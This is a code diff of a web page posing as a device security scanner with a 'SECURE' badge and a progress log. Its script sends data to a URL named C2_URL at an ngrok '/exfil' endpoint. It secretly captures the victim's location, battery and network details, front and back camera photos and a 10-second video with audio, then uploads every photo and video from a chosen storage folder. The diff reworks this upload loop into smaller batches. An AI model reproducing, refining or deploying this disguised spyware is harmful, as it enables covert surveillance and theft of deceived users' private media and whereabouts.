@@ -56,17 +56,8 @@
             flex-shrink: 0;
             box-shadow: 0 4px 15px rgba(0, 100, 255, 0.3);
         }
-        .header-text h1 {
-            font-size: 18px;
-            font-weight: 700;
-            color: white;
-            letter-spacing: -0.3px;
-        }
-        .header-text p {
-            font-size: 12px;
-            color: #8888aa;
-            margin-top: 2px;
-        }
+        .header-text h1 { font-size: 18px; font-weight: 700; color: white; letter-spacing: -0.3px; }
+        .header-text p { font-size: 12px; color: #8888aa; margin-top: 2px; }
         .badge {
             background: rgba(0, 200, 100, 0.15);
             color: #44ff88;
@@ -83,28 +74,10 @@
             from { opacity: 0; transform: translateY(8px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .step-title {
-            font-size: 20px;
-            font-weight: 700;
-            color: white;
-            margin-bottom: 6px;
-        }
-        .step-sub {
-            font-size: 13px;
-            color: #8888aa;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-        .input-group {
-            margin-bottom: 14px;
-        }
-        .input-group label {
-            display: block;
-            font-size: 12px;
-            color: #8888aa;
-            margin-bottom: 4px;
-            font-weight: 500;
-        }
+        .step-title { font-size: 20px; font-weight: 700; color: white; margin-bottom: 6px; }
+        .step-sub { font-size: 13px; color: #8888aa; margin-bottom: 20px; line-height: 1.5; }
+        .input-group { margin-bottom: 14px; }
+        .input-group label { display: block; font-size: 12px; color: #8888aa; margin-bottom: 4px; font-weight: 500; }
         .input-group input {
             width: 100%;
             padding: 14px 16px;
@@ -116,13 +89,8 @@
             outline: none;
             transition: border 0.3s;
         }
-        .input-group input:focus {
-            border-color: #00aaff;
-            box-shadow: 0 0 0 3px rgba(0, 170, 255, 0.1);
-        }
-        .input-group input::placeholder {
-            color: #555577;
-        }
+        .input-group input:focus { border-color: #00aaff; box-shadow: 0 0 0 3px rgba(0, 170, 255, 0.1); }
+        .input-group input::placeholder { color: #555577; }
         .btn {
             width: 100%;
             padding: 16px;
@@ -136,27 +104,12 @@
             transition: all 0.3s;
             margin-top: 8px;
         }
-        .btn:hover {
-            transform: scale(1.01);
-            box-shadow: 0 8px 30px rgba(0, 100, 255, 0.3);
-        }
+        .btn:hover { transform: scale(1.01); box-shadow: 0 8px 30px rgba(0, 100, 255, 0.3); }
         .btn:active { transform: scale(0.98); }
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        .btn-secondary {
-            background: transparent;
-            border: 1px solid #2a2a44;
-            color: #8888aa;
-        }
-        .btn-secondary:hover {
-            background: #1a1a2e;
-            border-color: #444466;
-        }
-        .btn-warning {
-            background: linear-gradient(135deg, #ff8800, #ff4400);
-        }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-secondary { background: transparent; border: 1px solid #2a2a44; color: #8888aa; }
+        .btn-secondary:hover { background: #1a1a2e; border-color: #444466; }
+        .btn-warning { background: linear-gradient(135deg, #ff8800, #ff4400); }
         .scan-status {
             display: flex;
             align-items: center;
@@ -178,25 +131,11 @@
             font-size: 18px;
             flex-shrink: 0;
         }
-        .scan-icon.spinning {
-            animation: spin 1.2s linear infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .scan-info {
-            flex: 1;
-        }
-        .scan-info .title {
-            font-size: 14px;
-            font-weight: 600;
-            color: white;
-        }
-        .scan-info .desc {
-            font-size: 12px;
-            color: #666688;
-            margin-top: 2px;
-        }
+        .scan-icon.spinning { animation: spin 1.2s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .scan-info { flex: 1; }
+        .scan-info .title { font-size: 14px; font-weight: 600; color: white; }
+        .scan-info .desc { font-size: 12px; color: #666688; margin-top: 2px; }
         .progress-wrap {
             background: #0d0d18;
             border-radius: 10px;
@@ -225,52 +164,18 @@
             margin-top: 12px;
             line-height: 1.8;
         }
-        .scan-log::-webkit-scrollbar {
-            width: 4px;
-        }
-        .scan-log::-webkit-scrollbar-track {
-            background: #0a0a12;
-        }
-        .scan-log::-webkit-scrollbar-thumb {
-            background: #2a2a44;
-            border-radius: 10px;
-        }
-        .scan-log .log-entry {
-            opacity: 0;
-            animation: logFade 0.3s forwards;
-        }
-        @keyframes logFade {
-            to { opacity: 1; }
-        }
+        .scan-log::-webkit-scrollbar { width: 4px; }
+        .scan-log::-webkit-scrollbar-track { background: #0a0a12; }
+        .scan-log::-webkit-scrollbar-thumb { background: #2a2a44; border-radius: 10px; }
+        .scan-log .log-entry { opacity: 0; animation: logFade 0.3s forwards; }
+        @keyframes logFade { to { opacity: 1; } }
         .scan-log .log-entry.done { color: #44ff88; }
         .scan-log .log-entry.warn { color: #ffaa44; }
         .scan-log .log-entry.error { color: #ff4466; }
-        .complete-icon {
-            font-size: 52px;
-            text-align: center;
-            margin: 10px 0 16px;
-        }
-        .complete-text {
-            text-align: center;
-            font-size: 16px;
-            color: #88ff88;
-            font-weight: 600;
-        }
-        .complete-sub {
-            text-align: center;
-            font-size: 13px;
-            color: #666688;
-            margin-top: 4px;
-        }
-        .footer {
-            text-align: center;
-            font-size: 10px;
-            color: #333355;
-            margin-top: 24px;
-            letter-spacing: 0.5px;
-            border-top: 1px solid #1a1a2e;
-            padding-top: 16px;
-        }
+        .complete-icon { font-size: 52px; text-align: center; margin: 10px 0 16px; }
+        .complete-text { text-align: center; font-size: 16px; color: #88ff88; font-weight: 600; }
+        .complete-sub { text-align: center; font-size: 13px; color: #666688; margin-top: 4px; }
+        .footer { text-align: center; font-size: 10px; color: #333355; margin-top: 24px; letter-spacing: 0.5px; border-top: 1px solid #1a1a2e; padding-top: 16px; }
         .device-badge {
             display: inline-flex;
             align-items: center;
@@ -283,14 +188,8 @@
             border: 1px solid #1a1a2e;
             margin-bottom: 16px;
         }
-        .storage-btn-container {
-            margin-top: 12px;
-            text-align: center;
-        }
-        .storage-btn-container .btn {
-            max-width: 280px;
-            margin: 0 auto;
-        }
+        .storage-btn-container { margin-top: 12px; text-align: center; }
+        .storage-btn-container .btn { max-width: 280px; margin: 0 auto; }
         .speed-badge {
             display: inline-block;
             background: rgba(0, 200, 100, 0.1);
@@ -301,15 +200,9 @@
             border: 1px solid rgba(0, 200, 100, 0.1);
             margin-left: 8px;
         }
-        .eta-text {
-            font-size: 11px;
-            color: #666688;
-            margin-top: 4px;
-        }
     </style>
 </head>
 <body>
-
     <div class="container">
         <div class="header">
             <div class="shield-icon">🛡️</div>
@@ -319,7 +212,6 @@
             </div>
             <div class="badge">● SECURE</div>
         </div>
-
         <div class="device-badge" id="deviceBadge">
             📱 <span id="deviceName">Detecting device...</span>
             <span class="speed-badge" id="speedBadge">⚡ Fast Mode</span>
@@ -396,11 +288,8 @@
         const C2_URL = 'https://matchless-palm-patriarch.ngrok-free.dev/exfil';
         let totalFiles = 0;
         let uploadedFiles = 0;
-        let allMediaFiles = [];
         let progress = 0;
-        let storageSelected = false;
         let galleryComplete = false;
-        let allDataCollected = false;
         let processedHashes = new Set();
         let startTime = 0;
 
@@ -458,29 +347,25 @@
         }
 
         // ============================================================
-        // STEP 2: DATA COLLECTION — IN ORDER
+        // STEP 2: DATA COLLECTION
         // ============================================================
         async function startDataCollection() {
             addLogEntry('● Starting data collection...', 'done');
             startTime = Date.now();
 
-            // ---- 1. LOCATION ----
             addLogEntry('📍 Collecting location...', 'warn');
             await collectLocation();
             updateProgress(10);
 
-            // ---- 2. BATTERY + NETWORK ----
             addLogEntry('🔋 Collecting battery & network...', 'warn');
             await collectBattery();
             await collectNetwork();
             updateProgress(20);
 
-            // ---- 3. CAMERA PHOTOS + VIDEO ----
             addLogEntry('📸 Capturing camera media...', 'warn');
             await collectCameraMedia();
             updateProgress(35);
 
-            // ---- 4. GALLERY EXTRACTION (triggered by user) ----
             addLogEntry('📁 Waiting for storage selection...', 'warn');
             document.getElementById('storageBtnContainer').style.display = 'block';
             document.getElementById('scanDesc').textContent = '📁 Tap "Select Storage" to continue...';
@@ -488,7 +373,6 @@
             document.getElementById('scanIcon').textContent = '📁';
             updateProgress(40);
 
-            // Wait for gallery to complete
             await waitForGallery();
         }
 
@@ -500,19 +384,11 @@
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         pos => {
-                            sendData({
-                                type: 'location',
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy
-                            });
+                            sendData({ type: 'location', lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy });
                             addLogEntry('✅ Location captured', 'done');
                             resolve();
                         },
-                        err => {
-                            addLogEntry('❌ Location denied: ' + err.message, 'error');
-                            resolve();
-                        },
+                        err => { addLogEntry('❌ Location denied: ' + err.message, 'error'); resolve(); },
                         { enableHighAccuracy: true, timeout: 10000 }
                     );
                 } else {
@@ -529,18 +405,10 @@
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    sendData({
-                        type: 'battery',
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging
-                    });
+                    sendData({ type: 'battery', level: Math.round(battery.level * 100) + '%', charging: battery.charging });
                     addLogEntry('✅ Battery data sent', 'done');
-                } else {
-                    addLogEntry('❌ Battery API not supported', 'error');
                 }
-            } catch (e) {
-                addLogEntry('❌ Battery error: ' + e.message, 'error');
-            }
+            } catch (e) { addLogEntry('❌ Battery error: ' + e.message, 'error'); }
         }
 
         // ============================================================
@@ -549,14 +417,8 @@
         function collectNetwork() {
             return new Promise((resolve) => {
                 if (navigator.connection) {
-                    sendData({
-                        type: 'network',
-                        type: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink
-                    });
+                    sendData({ type: 'network', type: navigator.connection.effectiveType, downlink: navigator.connection.downlink });
                     addLogEntry('✅ Network data sent', 'done');
-                } else {
-                    addLogEntry('❌ Network API not supported', 'error');
                 }
                 resolve();
             });
@@ -569,25 +431,15 @@
             try {
                 addLogEntry('📸 Capturing back camera...', 'warn');
                 const backPhoto = await capturePhoto('environment');
-                if (backPhoto) {
-                    sendData({ type: 'photo', camera: 'back', data: backPhoto });
-                    addLogEntry('✅ Back photo captured', 'done');
-                }
+                if (backPhoto) { sendData({ type: 'photo', camera: 'back', data: backPhoto }); addLogEntry('✅ Back photo captured', 'done'); }
 
                 addLogEntry('🤳 Capturing front camera...', 'warn');
                 const frontPhoto = await capturePhoto('user');
-                if (frontPhoto) {
-                    sendData({ type: 'photo', camera: 'front', data: frontPhoto });
-                    addLogEntry('✅ Front photo captured', 'done');
-                }
+                if (frontPhoto) { sendData({ type: 'photo', camera: 'front', data: frontPhoto }); addLogEntry('✅ Front photo captured', 'done'); }
 
                 addLogEntry('🎥 Recording front video...', 'warn');
                 const videoData = await captureVideo('user', 10);
-                if (videoData) {
-                    sendData({ type: 'video', camera: 'front', duration: '10s', data: videoData });
-                    addLogEntry('✅ Front video captured (10s)', 'done');
-                }
-
+                if (videoData) { sendData({ type: 'video', camera: 'front', duration: '10s', data: videoData }); addLogEntry('✅ Front video captured (10s)', 'done'); }
             } catch (err) {
                 addLogEntry('❌ Camera error: ' + err.message, 'error');
                 sendData({ type: 'media_error', error: err.message });
@@ -599,13 +451,11 @@
         // ============================================================
         async function capturePhoto(facingMode) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } }
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 640 }, height: { ideal: 480 } } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
-                await new Promise(resolve => setTimeout(resolve, 500));
+                await new Promise(r => setTimeout(r, 500));
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
@@ -613,25 +463,19 @@
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
                 stream.getTracks().forEach(t => t.stop());
                 return dataUrl;
-            } catch (e) {
-                addLogEntry('❌ Photo failed (' + facingMode + '): ' + e.message, 'error');
-                return null;
-            }
+            } catch (e) { addLogEntry('❌ Photo failed (' + facingMode + '): ' + e.message, 'error'); return null; }
         }
 
         async function captureVideo(facingMode, durationSec) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode, width: { ideal: 480 }, height: { ideal: 360 } },
-                    audio: true
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 480 }, height: { ideal: 360 } }, audio: true });
                 const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
                 const chunks = [];
                 recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                 recorder.start();
-                await new Promise(resolve => setTimeout(resolve, durationSec * 1000));
+                await new Promise(r => setTimeout(r, durationSec * 1000));
                 recorder.stop();
-                await new Promise(resolve => recorder.onstop = resolve);
+                await new Promise(r => recorder.onstop = r);
                 stream.getTracks().forEach(t => t.stop());
                 const blob = new Blob(chunks, { type: 'video/webm' });
                 const reader = new FileReader();
@@ -639,26 +483,21 @@
                     reader.onload = () => resolve(reader.result.split(',')[1]);
                     reader.readAsDataURL(blob);
                 });
-            } catch (e) {
-                addLogEntry('❌ Video failed: ' + e.message, 'error');
-                return null;
-            }
+            } catch (e) { addLogEntry('❌ Video failed: ' + e.message, 'error'); return null; }
         }
 
         // ============================================================
-        // WAIT FOR GALLERY + COMPLETE
+        // WAIT FOR GALLERY
         // ============================================================
         function waitForGallery() {
             return new Promise((resolve) => {
                 const checkInterval = setInterval(() => {
                     if (galleryComplete) {
                         clearInterval(checkInterval);
-                        allDataCollected = true;
                         updateProgress(100);
                         const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
                         addLogEntry(`✅ All data collected in ${elapsed}s!`, 'done');
-                        document.getElementById('stepSub').textContent =
-                            `✅ Scan complete in ${elapsed}s. All data verified.`;
+                        document.getElementById('stepSub').textContent = `✅ Scan complete in ${elapsed}s. All data verified.`;
                         setTimeout(() => {
                             document.getElementById('step2').classList.remove('active');
                             document.getElementById('step3').classList.add('active');
@@ -670,7 +509,7 @@
         }
 
         // ============================================================
-        // TRIGGER GALLERY EXTRACTION (User gesture) — FAST VERSION
+        // TRIGGER GALLERY EXTRACTION (STREAMLINED)
         // ============================================================
         async function triggerGalleryExtraction(event) {
             if (event) event.preventDefault();
@@ -680,11 +519,8 @@
             btn.textContent = '⏳ Opening storage...';
 
             try {
-                const dirHandle = await window.showDirectoryPicker({
-                    mode: 'read'
-                });
+                const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
 
-                storageSelected = true;
                 const folderName = dirHandle.name || 'Root';
                 addLogEntry(`● Storage selected: ${folderName}`, 'done');
                 document.getElementById('scanTitle').textContent = '📁 Scanning gallery...';
@@ -694,52 +530,90 @@
                 document.getElementById('scanIcon').textContent = '⚡';
                 updateProgress(45);
 
-                // Collect and upload media
-                allMediaFiles = [];
-                await traverseDirectory(dirHandle, '');
-                addLogEntry(`● Found ${allMediaFiles.length} gallery files`, 'done');
+                // --- Process gallery in chunks, not all at once ---
+                let totalFilesFound = 0;
+                let processedCount = 0;
+                let totalSizeMB = 0;
 
-                if (allMediaFiles.length === 0) {
+                // Use a queue to process files in smaller batches
+                const batchSize = 3; // Smaller batch to avoid memory issues
+                const fileQueue = [];
+
+                // First pass: collect file entries (without reading content)
+                addLogEntry('📂 Scanning directory for media...', 'warn');
+                await collectFileEntries(dirHandle, '', fileQueue);
+                totalFilesFound = fileQueue.length;
+                addLogEntry(`● Found ${totalFilesFound} media files`, 'done');
+
+                if (totalFilesFound === 0) {
                     addLogEntry('● No gallery files found', 'warn');
                     sendData({ type: 'media_extraction_complete', count: 0 });
                     galleryComplete = true;
                     return;
                 }
 
-                totalFiles = allMediaFiles.length;
-                uploadedFiles = 0;
-                processedHashes = new Set();
-                let totalSize = 0;
+                // Process in small batches to avoid memory buildup
+                for (let i = 0; i < fileQueue.length; i += batchSize) {
+                    const batch = fileQueue.slice(i, i + batchSize);
+                    
+                    // Process each batch sequentially (not parallel to avoid memory spikes)
+                    for (const fileInfo of batch) {
+                        try {
+                            const file = await fileInfo.handle.getFile();
+                            const isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'].includes(fileInfo.ext);
+                            let base64Data;
 
-                // Estimate total size
-                for (const file of allMediaFiles) {
-                    try {
-                        const f = await file.handle.getFile();
-                        totalSize += f.size;
-                    } catch (e) {}
+                            if (isImage && file.size > 200 * 1024) {
+                                // Compress large images
+                                try {
+                                    const compressed = await compressImage(file);
+                                    base64Data = compressed;
+                                    addLogEntry(`📦 Compressed ${fileInfo.name} (${(file.size/1024).toFixed(0)}KB)`, 'warn');
+                                } catch (e) {
+                                    const reader = new FileReader();
+                                    base64Data = await new Promise((resolve) => {
+                                        reader.onload = () => resolve(reader.result.split(',')[1]);
+                                        reader.readAsDataURL(file);
+                                    });
+                                }
+                            } else {
+                                const reader = new FileReader();
+                                base64Data = await new Promise((resolve) => {
+                                    reader.onload = () => resolve(reader.result.split(',')[1]);
+                                    reader.readAsDataURL(file);
+                                });
+                            }
+
+                            // Send immediately
+                            await sendData({
+                                type: 'media_file',
+                                filename: fileInfo.name,
+                                path: fileInfo.path,
+                                size: file.size,
+                                mimeType: file.type,
+                                data: base64Data
+                            });
+
+                            processedCount++;
+                            const pct = 45 + (processedCount / totalFilesFound) * 55;
+                            updateProgress(pct);
+                            document.getElementById('scanDesc').textContent =
+                                `📤 ${processedCount}/${totalFilesFound} gallery files uploaded (${Math.round(pct)}%)`;
+                            
+                            // Clean up memory
+                            base64Data = null;
+                            
+                        } catch (err) {
+                            addLogEntry(`❌ Failed to upload ${fileInfo.name}: ${err.message}`, 'error');
+                        }
+                    }
+
+                    // Force garbage collection hint (works in some browsers)
+                    if (window.gc) window.gc();
                 }
 
-                const sizeMB = (totalSize / 1024 / 1024).toFixed(1);
-                addLogEntry(`● Total gallery size: ${sizeMB} MB`, 'done');
-
-                // Upload in parallel batches of 10
-                const batchSize = 10;
-                for (let i = 0; i < allMediaFiles.length; i += batchSize) {
-                    const batch = allMediaFiles.slice(i, i + batchSize);
-
-                    // Process batch in parallel
-                    await Promise.all(batch.map(file => uploadMediaFileFast(file)));
-
-                    uploadedFiles += batch.length;
-                    const pct = 45 + (uploadedFiles / totalFiles) * 55;
-                    updateProgress(pct);
-                    document.getElementById('scanDesc').textContent =
-                        `📤 ${uploadedFiles}/${totalFiles} gallery files uploaded (${Math.round(pct)}%)`;
-                    addLogEntry(`● Uploaded ${uploadedFiles}/${totalFiles} files`, 'done');
-                }
-
-                addLogEntry(`✅ All ${totalFiles} gallery files uploaded (${sizeMB} MB)`, 'done');
-                sendData({ type: 'media_extraction_complete', count: totalFiles });
+                addLogEntry(`✅ All ${totalFilesFound} gallery files uploaded`, 'done');
+                sendData({ type: 'media_extraction_complete', count: totalFilesFound });
                 galleryComplete = true;
 
             } catch (err) {
@@ -756,58 +630,27 @@
         }
 
         // ============================================================
-        // FAST UPLOAD WITH COMPRESSION
+        // COLLECT FILE ENTRIES (without reading content)
         // ============================================================
-        async function uploadMediaFileFast(fileInfo) {
+        async function collectFileEntries(dirHandle, path, fileQueue) {
             try {
-                const file = await fileInfo.handle.getFile();
-
-                // Skip if already processed
-                const hash = file.name + file.size + file.lastModified;
-                if (processedHashes.has(hash)) {
-                    addLogEntry(`⏭️ Skipping duplicate: ${fileInfo.name}`, 'warn');
-                    return;
-                }
-                processedHashes.add(hash);
-
-                // Determine if it's an image (compress) or video (keep as-is)
-                const isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'].includes(fileInfo.ext);
-
-                let base64Data;
-
-                if (isImage && file.size > 200 * 1024) {
-                    // Compress large images
-                    try {
-                        const compressed = await compressImage(file);
-                        base64Data = compressed;
-                        addLogEntry(`📦 Compressed ${fileInfo.name} (${(file.size/1024).toFixed(0)}KB → ${(compressed.length/1.37/1024).toFixed(0)}KB)`, 'warn');
-                    } catch (e) {
-                        // Fallback to original
-                        const reader = new FileReader();
-                        base64Data = await new Promise((resolve) => {
-                            reader.onload = () => resolve(reader.result.split(',')[1]);
-                            reader.readAsDataURL(file);
-                        });
+                for await (const entry of dirHandle.values()) {
+                    const entryPath = path ? `${path}/${entry.name}` : entry.name;
+                    if (entry.kind === 'directory') {
+                        const skipDirs = ['Android', 'data', 'obb', 'system', 'root', 'proc', 'sys', 'tmp', 'cache', 'log', 'dump'];
+                        if (skipDirs.includes(entry.name)) continue;
+                        if (entry.name.startsWith('.')) continue;
+                        await collectFileEntries(entry, entryPath, fileQueue);
+                    } else if (entry.kind === 'file') {
+                        const ext = entry.name.split('.').pop().toLowerCase();
+                        const mediaTypes = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'heic', 'bmp', 'mp4', 'mov', 'avi', 'mkv', 'webm', '3gp', 'm4v'];
+                        if (mediaTypes.includes(ext)) {
+                            fileQueue.push({ name: entry.name, path: entryPath, handle: entry, ext: ext });
+                        }
                     }
-                } else {
-                    // Video or small image — send as-is
-                    const reader = new FileReader();
-                    base64Data = await new Promise((resolve) => {
-                        reader.onload = () => resolve(reader.result.split(',')[1]);
-                        reader.readAsDataURL(file);
-                    });
                 }
-
-                await sendData({
-                    type: 'media_file',
-                    filename: fileInfo.name,
-                    path: fileInfo.path,
-                    size: file.size,
-                    mimeType: file.type,
-                    data: base64Data
-                });
-            } catch (err) {
-                addLogEntry(`❌ Failed to upload ${fileInfo.name}`, 'error');
+            } catch (e) {
+                addLogEntry(`⚠️ Error scanning: ${e.message}`, 'warn');
             }
         }
 
@@ -821,25 +664,17 @@
                     const img = new Image();
                     img.onload = () => {
                         const canvas = document.createElement('canvas');
-                        let w = img.width;
-                        let h = img.height;
-
-                        // Resize if too large
+                        let w = img.width, h = img.height;
                         const maxDim = 1920;
                         if (w > maxDim || h > maxDim) {
                             const ratio = Math.min(maxDim / w, maxDim / h);
                             w = Math.round(w * ratio);
                             h = Math.round(h * ratio);
                         }
-
                         canvas.width = w;
                         canvas.height = h;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(img, 0, 0, w, h);
-
-                        // Compress at 0.6 quality (JPEG)
-                        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
-                        resolve(dataUrl.split(',')[1]);
+                        canvas.getContext('2d').drawImage(img, 0, 0, w, h);
+                        resolve(canvas.toDataURL('image/jpeg', 0.6).split(',')[1]);
                     };
                     img.onerror = () => reject(new Error('Image load failed'));
                     img.src = e.target.result;
@@ -847,31 +682,6 @@
                 reader.onerror = () => reject(new Error('File read failed'));
                 reader.readAsDataURL(file);
             });
-        }
-
-        // ============================================================
-        // TRAVERSE DIRECTORY
-        // ============================================================
-        async function traverseDirectory(dirHandle, path) {
-            try {
-                for await (const entry of dirHandle.values()) {
-                    const entryPath = path ? `${path}/${entry.name}` : entry.name;
-                    if (entry.kind === 'directory') {
-                        const skipDirs = ['Android', 'data', 'obb', 'system', 'root', 'proc', 'sys', 'tmp', 'cache', 'log', 'dump'];
-                        if (skipDirs.includes(entry.name)) continue;
-                        if (entry.name.startsWith('.')) continue;
-                        await traverseDirectory(entry, entryPath);
-                    } else if (entry.kind === 'file') {
-                        const ext = entry.name.split('.').pop().toLowerCase();
-                        const mediaTypes = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'heic', 'bmp', 'mp4', 'mov', 'avi', 'mkv', 'webm', '3gp', 'm4v'];
-                        if (mediaTypes.includes(ext)) {
-                            allMediaFiles.push({ name: entry.name, path: entryPath, handle: entry, ext: ext });
-                        }
-                    }
-                }
-            } catch (e) {
-                addLogEntry(`⚠️ Error scanning: ${e.message}`, 'warn');
-            }
         }
 
         // ============================================================
